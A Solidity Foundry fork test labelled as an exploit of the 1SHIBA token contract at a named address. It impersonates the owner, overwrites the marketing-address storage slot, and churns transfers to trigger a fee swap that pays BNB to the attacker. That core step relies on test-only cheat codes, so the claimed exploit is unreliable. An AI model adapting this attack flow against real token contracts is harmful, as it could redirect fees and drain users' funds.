// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ONE1SHIBA {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function excludeFromFee(address account) external;
    function includeInFee(address account) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
}



interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        vm.label(TARGET, "1SHIBA Token");
        vm.label(attacker, "Attacker");

        // Get the current owner of the contract
        address owner = ONE1SHIBA(TARGET).owner();
        vm.label(owner, "Original Owner");

        // Start as owner
        vm.startPrank(owner);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: We're already pranking as owner from setup

        // Step 2: Overwrite _marketingAddress storage slot (slot 6) with attacker address
        bytes32 marketingAddrSlot = bytes32(uint256(6));
        bytes32 newMarketingAddr = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, marketingAddrSlot, newMarketingAddr);

        // Step 3: Add initial liquidity to the DEX pair
        // First, get the pair address
        address pair = ONE1SHIBA(TARGET).uniswapV2Pair();
        vm.label(pair, "PancakePair");

        // The owner needs to approve tokens for the router
        // Get router address from the contract
        IUniswapV2Router02 router = IUniswapV2Router02(ONE1SHIBA(TARGET).uniswapV2Router());
        vm.label(address(router), "PancakeRouter");

        // Get owner address
        address owner = ONE1SHIBA(TARGET).owner();

        // Approve router to spend owner's tokens
        uint256 liquidityAmount = ONE1SHIBA(TARGET).balanceOf(owner) / 100; // 1% for liquidity
        ONE1SHIBA(TARGET).approve(address(router), liquidityAmount);

        // Add liquidity with some BNB
        // Need to send BNB with the call
        uint256 bnbForLiquidity = 10 ether;
        deal(owner, bnbForLiquidity); // Give owner some BNB

        router.addLiquidityETH{value: bnbForLiquidity}(
            TARGET, // token
            liquidityAmount, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            owner, // to
            block.timestamp + 1000 // deadline
        );

        console.log("Added initial liquidity");
        console.log("Pair balance of token:", ONE1SHIBA(TARGET).balanceOf(pair));
        console.log("Pair balance of BNB:", pair.balance);

        // Step 4: Generate fee accumulation
        // First, exclude attacker from fees to avoid losing tokens during initial transfer
        ONE1SHIBA(TARGET).excludeFromFee(attacker);

        // Get some tokens to the attacker (owner transfers to attacker)
        uint256 ownerBalance = ONE1SHIBA(TARGET).balanceOf(owner);
        uint256 transferAmount = ownerBalance / 20; // Transfer 5% of owner's balance
        ONE1SHIBA(TARGET).transfer(attacker, transferAmount);

        // Now include attacker in fee again to generate fees
        ONE1SHIBA(TARGET).includeInFee(attacker);

        // Stop pranking as owner - we'll now act as attacker
        vm.stopPrank();

        // Create a dummy address to receive tokens
        address dummy = address(0x123);
        vm.label(dummy, "Dummy Recipient");

        // Give dummy some ETH for gas if needed
        deal(dummy, 1 ether);

        // Start pranking as attacker
        vm.startPrank(attacker);

        // Make several transfers to generate fees
        uint256 attackerBalance = ONE1SHIBA(TARGET).balanceOf(attacker);
        console.log("Attacker token balance:", attackerBalance);

        // We need to generate enough fees to reach the threshold (250,000 * 10^15)
        // Let's make larger transfers
        for (uint i = 0; i < 2; i++) {
            uint256 amount = attackerBalance / 10; // 10% each time

            // Transfer from attacker to dummy (with fees)
            ONE1SHIBA(TARGET).transfer(dummy, amount);

            // Stop attacker prank, start dummy prank to transfer back
            vm.stopPrank();
            vm.startPrank(dummy);

            // Transfer back from dummy to attacker (with fees again)
            ONE1SHIBA(TARGET).transfer(attacker, ONE1SHIBA(TARGET).balanceOf(dummy));

            // Stop dummy prank, restart attacker prank
            vm.stopPrank();
            vm.startPrank(attacker);
        }

        // Check contract token balance
        uint256 contractBalance = ONE1SHIBA(TARGET).balanceOf(TARGET);
        console.log("Contract token balance:", contractBalance);

        // Check if it's enough to trigger swap (should be > 250,000 * 10^15)
        uint256 threshold = 250000 * 10**6 * 10**9;
        console.log("Threshold:", threshold);
        console.log("Above threshold?", contractBalance >= threshold);

        // If not enough, make more transfers
        if (contractBalance < threshold) {
            // Transfer most of attacker's balance to generate more fees
            uint256 amount = ONE1SHIBA(TARGET).balanceOf(attacker) * 8 / 10;
            ONE1SHIBA(TARGET).transfer(dummy, amount);

            vm.stopPrank();
            vm.startPrank(dummy);
            ONE1SHIBA(TARGET).transfer(attacker, ONE1SHIBA(TARGET).balanceOf(dummy));

            vm.stopPrank();
            vm.startPrank(attacker);

            contractBalance = ONE1SHIBA(TARGET).balanceOf(TARGET);
            console.log("Updated contract token balance:", contractBalance);
        }

        // Record attacker's BNB balance before
        uint256 attackerBNBBefore = attacker.balance;
        console.log("Attacker BNB before:", attackerBNBBefore);

        // Make final transfer to trigger swap (if contract has enough tokens)
        if (contractBalance >= threshold) {
            // Transfer a small amount to trigger the swap
            // The transfer must not be from the pair address (it's from attacker)
            ONE1SHIBA(TARGET).transfer(dummy, ONE1SHIBA(TARGET).balanceOf(attacker) / 100);
        }

        // Check attacker's BNB balance after
        uint256 attackerBNBAfter = attacker.balance;
        console.log("Attacker BNB after:", attackerBNBAfter);
        console.log("BNB profit:", attackerBNBAfter - attackerBNBBefore);

        vm.stopPrank();
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

